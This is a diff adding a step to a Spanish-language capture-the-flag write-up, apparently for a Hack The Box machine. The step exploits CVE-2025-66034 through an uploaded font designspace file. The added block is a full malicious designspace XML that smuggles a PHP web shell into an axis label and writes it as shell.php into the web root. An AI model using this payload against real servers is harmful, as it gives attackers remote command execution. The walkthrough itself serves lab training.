@@ -99,6 +99,35 @@ Encontrando el fichero `download.php` en el cual a la hora de acceder te pide el
 
 Necesitaremos subir el archivo `.ttf` y el `.desingspace` explotando la vulnerabilidad `CVE-2025-66034` pudiendo encontrar una guía en `https://github.com/advisories/GHSA-768j-98cg-p3fv`, tendremos que subir los dos archivos e interceptar la petición pudiendo modificar el `malicious.designspace` para ejecutar un RCE
 
+Cuando se modifica la petición incluimos el siguiente contenido en el `malicious.desingspace`
+```xml
+<?xml version='1.0' encoding='UTF-8'?> 
+<designspace format="5.0">
+	<axes> 
+		<axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
+			<labelname xml:lang="en"><![CDATA[<?php system($_GET["cmd"]); ?>]]]]><![CDATA[>]]></labelname> 
+		</axis>
+	</axes>
+	<sources>
+		<source filename="source-light.ttf" name="Light">
+			<location><dimension name="Weight" xvalue="100"/></location>
+		</source> 
+		<source filename="source-regular.ttf" name="Regular">
+			<location><dimension name="Weight" xvalue="400"/></location>
+		</source>
+	</sources>
+	<variable-fonts>
+		<variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/shell.php">
+			<axis-subsets>
+				<axis-subset name="Weight"/>
+			</axis-subsets>
+		</variable-font>
+	</variable-fonts>
+</designspace>
+```
+
+
+
 
 
 
